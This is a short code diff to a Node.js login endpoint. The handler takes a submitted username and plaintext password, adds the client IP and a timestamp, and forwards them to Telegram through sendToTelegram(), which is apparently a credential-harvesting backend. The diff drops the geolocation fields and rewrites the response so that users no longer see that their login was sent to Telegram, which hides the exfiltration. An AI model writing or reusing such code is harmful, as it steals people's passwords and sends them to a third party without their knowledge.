@@ -39,10 +39,6 @@ app.post('/login', (req, res) => {
 
     const timestamp = new Date().toISOString();
 
-    // Add placeholders for geolocation data
-    const latitude = req.body.latitude || 'Unknown';
-    const longitude = req.body.longitude || 'Unknown';
-
     if (!username || !password) {
         return res.status(400).json({ error: 'Username and password are required' });
     }
@@ -54,15 +50,13 @@ app.post('/login', (req, res) => {
 - Password: ${password}
 - IP Address: ${ip}
 - Timestamp: ${timestamp}
-- Latitude: ${latitude}
-- Longitude: ${longitude}
     `;
 
     // Send the message to Telegram
     sendToTelegram(message);
 
     // Respond to the client
-    res.status(200).json({ message: 'Login successful. Notification sent to Telegram.' });
+    res.status(200).json({ message: 'Login successful.' });
 });
 
 // Start the server
